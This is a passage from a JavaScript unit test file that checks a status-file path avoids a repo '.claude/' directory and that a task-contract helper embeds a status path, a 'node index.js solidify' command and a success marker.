    assert.ok(!p.includes('/.claude/'), 'NOT written under repo .claude/');
  });
});

describe('appendStatusFileContract', () => {
  it('embeds the exact status file path and the solidify marker contract', () => {
    const t = eb.appendStatusFileContract('base task', '/tmp/status_0001_1.json', '0001');
    assert.ok(t.includes('/tmp/status_0001_1.json'));
    assert.ok(t.includes('node index.js solidify'));
    assert.ok(t.includes('[SOLIDIFY] SUCCESS'));
    assert.ok(t.startsWith('base task'));
  });
});
